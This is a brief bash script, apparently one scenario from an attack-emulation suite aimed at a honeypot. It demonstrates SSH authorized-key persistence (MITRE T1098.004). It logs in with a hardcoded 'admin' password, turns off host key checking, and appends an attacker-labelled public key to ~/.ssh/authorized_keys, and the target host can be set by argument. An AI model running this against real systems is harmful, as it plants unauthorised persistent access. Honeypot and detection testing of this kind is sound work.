#!/usr/bin/env bash
# S15 — SSH Authorized Key Backdoor
# Tactic : Persistence (TA0003)
# Technique: T1098.004 Account Manipulation: SSH Authorized Keys
TARGET="${1:-safe-honeypot}"
SSH="sshpass -p admin ssh -o StrictHostKeyChecking=no -o ConnectTimeout=30 ${TARGET} -p 2222"
echo "=== S15 SSH Backdoor — ${TARGET} ==="
timeout ${TIMEOUT:-45} $SSH "mkdir -p ~/.ssh && chmod 700 ~/.ssh; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC backdoor@attacker' >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys; cat ~/.ssh/authorized_keys" && echo "[OK]" || echo "[FAIL]"
